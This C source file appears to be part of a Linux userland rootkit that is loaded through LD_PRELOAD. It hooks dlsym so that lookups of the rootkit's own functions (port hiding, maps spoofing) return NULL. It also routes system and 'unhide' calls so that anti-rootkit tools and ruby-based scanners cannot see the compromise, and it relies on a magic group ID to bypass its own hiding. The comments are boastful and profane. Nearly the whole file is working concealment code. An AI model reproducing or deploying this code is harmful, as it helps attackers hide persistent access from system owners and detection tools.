#define _GNU_SOURCE
#define RK_SYSCALL_COUNT 9
#define SYSCALL_COUNT 35
#define UNHIDE_COUNT 8
#include <dlfcn.h>
int dlsym_debug=0;
extern void *_dl_sym(void *, const char *, void *);
static void * (*real_dlsym)(void *handle, const char *name);
void *libc, *rkit;
void *find_sym(void *handle, char *symbol) {
  char buf[32];
  int maxver = 40;
  void *func;
  func = dlsym(handle, symbol);
  if(!func) {
    for(int a=0;a<maxver;a++) {
      sprintf(buf, "GLIBC_2.%d", a);
      func = dlvsym(RTLD_NEXT,symbol, buf);
      if(func) return func;
    }
    for(int a=0;a<maxver;a++) {
      for(int b=0;b<maxver;b++) {
        sprintf(buf, "GLIBC_2.%d.%d", a, b);
        func = dlvsym(RTLD_NEXT,symbol, buf);
        if(func) return func;
      }
    }
    if(!func) func = _dl_sym(handle,symbol,find_sym);
    return func;
  }
  return func;
}

void find_dlsym() {


  char buf[32];
  int maxver = 40;

  //Works on Ubuntu
  for(int a=0;a<maxver;a++) {
    sprintf(buf, "GLIBC_2.%d", a);
    real_dlsym = (void*(*)(void *handle, const char *name)) dlvsym(RTLD_NEXT,"dlsym", buf);
    if(real_dlsym) return;
  }
  //Works on Debian
  for(int a=0;a<maxver;a++){
    for(int b=0;b<maxver;b++){
      sprintf(buf, "GLIBC_2.%d.%d", a, b);
      real_dlsym = (void*(*)(void *handle, const char *name)) dlvsym(RTLD_NEXT,"dlsym", buf);
      if(real_dlsym) return;
    }
  }
}
void *dlsym(void *handle, const char *name){ // Who's to know if your soul will fade at all? The one you sold to fool the world.
    int i;
    void *funcptr;
    char *rk_syscalls[] = {
      "esh", "netstat", "maps", "get_hideports", "is_hideport", "procstatus", "procstatus_o", "spoof_maps", "spoof_smaps"
    };
    char *unhide_syscalls[] = {
      "getsid", "getpriority","getpgid", "sysinfo", "sched_getaffinity",
      "sched_getscheduler", "sched_getparam", "sched_rr_get_interval"
    };
    char *syscalls[] = {
      "open", "readdir", "fopen", "getgid", "getregid",
      "access", "unlink", "lchown", "stat", "lstat",
      "lxstat", "xstat", "__xstat", "execve", "dlsym",
      "readdir", "readdir64", "link", "symlink", "rmdir",
      "open64", "chdir", "write", "kill", "rename",
      "opendir", "fdopendir", "unlinkat", "ptrace", "fopen64",
      "__fxstat", "chmod", "lchmod", "fchmod", "chown"
   }; //woooah you're such a fuckin hypocrit
    if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
    if(!rkit) rkit = dlopen("/lib/"MAGIC_STRING"."BUILD_ARCH,RTLD_LAZY);
    if(!real_dlsym) find_dlsym();
    if(dlsym_debug) fprintf(stderr,"dlsym (%p) debug %s..", real_dlsym, name);
    if(getgid() == MAGIC_GID && !strcmp(name,"setgid")) return real_dlsym(libc,"setgid"); // Exception for unhide-self
    if(!strcmp(name,"readlink") && ( !strncmp(get_my_procname(),"ruby",4) || !strncmp(get_my_procname(),"/usr/bin/ruby",13) ) ) return real_dlsym(rkit,"readlink"); // special unhide fuckers
    if(!strcmp(name,"kill") && ( !strncmp(get_my_procname(),"ruby",4) || !strncmp(get_my_procname(),"/usr/bin/ruby",13) ) ) return real_dlsym(rkit,"kill"); // special unhide fucker
    for (i = 0; i < UNHIDE_COUNT; ++i) {
        if(!strcmp(name,unhide_syscalls[i])) {
          if(dlsym_debug) fprintf(stderr,"returned rk func\n"); // I CAN FAKE WITH THE BEST OF ANYONE
          funcptr = real_dlsym(rkit,name);
          if(funcptr < (void *)5) { // something isn't right.
            return _dl_sym(rkit,name,dlsym);
          }
       return funcptr;
       }
    }
    for (i = 0; i < RK_SYSCALL_COUNT; ++i) {
        if(!strcmp(name,rk_syscalls[i])) {
          if(dlsym_debug) fprintf(stderr,"returned fake null ptr"); // I CAN FAKE WITH THE BEST OF EM ALL
          return NULL;
        }
    }
    for (i = 0; i < SYSCALL_COUNT; ++i) {
        if(!strcmp(name,syscalls[i])) {
          funcptr = real_dlsym(libc,name);
          if(dlsym_debug) fprintf(stderr,"returned lc func %p\n",funcptr); // I CAN FAKE IT AAAAAAAAAAAAAAAAALL
          return funcptr;
       }
    }
    funcptr = real_dlsym(handle,name);
    if(dlsym_debug) fprintf(stderr,"returned expected %p\n",funcptr);
    return funcptr;
}
